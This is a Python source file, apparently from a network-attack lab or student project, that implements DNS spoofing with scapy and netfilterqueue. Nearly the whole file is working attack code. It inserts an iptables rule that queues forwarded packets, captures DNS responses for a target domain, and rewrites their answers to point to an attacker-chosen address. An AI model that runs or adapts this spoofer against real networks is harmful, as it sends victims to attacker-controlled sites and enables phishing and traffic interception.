from scapy.all import *
import time
import threading

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

from netfilterqueue import NetfilterQueue

global listening
global list_of_dns

# class that houses dns spoofing code
class DnsSpoofing:
    # initializes the desired website for the victim to be redirected to
    def __init__(self, attacker_website_redirect):
        self.attacker_website_redirect = attacker_website_redirect
        self.dns_get_websites = {b"hatzwebsite.com.": attacker_website_redirect}

    # callback that processes each packet that is forwarded by the attacker
    def process_dns(self, packet):
        my_packet = IP(packet.get_payload())

        if my_packet.haslayer(DNSRR):
            try:
                my_packet = self.modify(my_packet)
            except IndexError:
                # not UDP packet, this can be IPerror/UDPerror packets
                pass
            if my_packet[DNS].an.rrname in self.dns_get_websites:
                packet.set_payload(bytes(my_packet))

        packet.accept()

    # modify the desired dns response packets
    def modify(self, packet):
        if packet[DNSQR].qname in self.dns_get_websites:

            packet[DNS].an = DNSRR()
            packet[DNS].an.rrname = packet[DNSQR].qname
            packet[DNS].an.rdata = self.attacker_website_redirect
            packet[DNS].ancount = 1

            packet[UDP].len = None
            packet[UDP].chksum = None
            packet[IP].len = None
            packet[IP].chksum = None

        return packet

    # executes poisoning
    def execute_poisoning(self):
        the_queue = NetfilterQueue()
        QUEUE_NUMBER = 1
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))

        try:
            the_queue.bind(QUEUE_NUMBER, self.process_dns)
            the_queue.run()
        except KeyboardInterrupt:
            the_queue.unbind()






